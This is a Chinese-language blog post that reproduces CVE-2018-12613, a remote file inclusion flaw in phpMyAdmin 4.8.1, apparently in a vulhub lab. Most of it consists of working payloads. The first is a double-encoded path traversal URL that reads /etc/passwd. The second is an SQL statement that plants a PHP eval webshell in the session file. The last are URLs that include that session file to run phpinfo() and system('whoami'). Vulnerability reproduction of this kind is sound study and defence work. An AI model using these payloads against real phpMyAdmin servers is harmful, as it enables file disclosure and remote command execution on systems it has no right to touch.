---
title: phpMyAdmin 4.8.1 远程文件包含(CVE-2018-12613)
date: 2020-07-01 21:17:26
categories: 漏洞复现
tags: phpMyAdmin
---

#### 背景

phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。其index.php中存在一处文件包含逻辑，通过二次编码即可绕过检查，造成远程文件包含漏洞。

<!--more-->

#### 复现过程

##### 漏洞验证

1.使用如下POC，若成功读取/etc/passwd文件内容，则存在漏洞

```
http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
```

![](http://qn.laohuan.xin/2020-06-30_20-10-11.png)

##### 利用session写shell

1.需先登录phpmyadmin，执行sql语句,代码为GET传参,图为POST传参

```php
SELECT "<?php eval($_GET['cmd']); ?>"
```

2.F12获取cookie

![](http://qn.laohuan.xin/2020-06-30_20-43-05.png)

将cookie的值和**sess_**拼接，便得到了存储在服务器端的session文件,这里注意，图中的cookie值因测试多次和实际值不一样，因为人懒，懒得再截图。

 `sess_575f961b1e574936b7a6e1d237f82ade`

![](http://qn.laohuan.xin/2020-07-01_16-31-03.png)

3.使用POC命令执行

当然实际环境中就根据经验或其他手段来猜测路径了

```url
http://URL:端口/index.php?cmd=phpinfo();&target=db_sql.php%253f/../../../../tmp/sess_575f961b1e574936b7a6e1d237f82ade
/var/www/html
```

![](http://qn.laohuan.xin/2020-07-01_20-48-30.png)

```
http://URL:端口/index.php?cmd=system(%27whoami%27);&target=db_sql.php%253f/../../../../tmp/sess_575f961b1e574936b7a6e1d237f82ade
```

![](http://qn.laohuan.xin/2020-07-01_21-00-22.png)

![](http://qn.laohuan.xin/2020-07-01_21-01-12.png)

#### 参考链接

<http://www.pianshen.com/article/6744149320/>

<http://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613/README.zh-cn.md/>

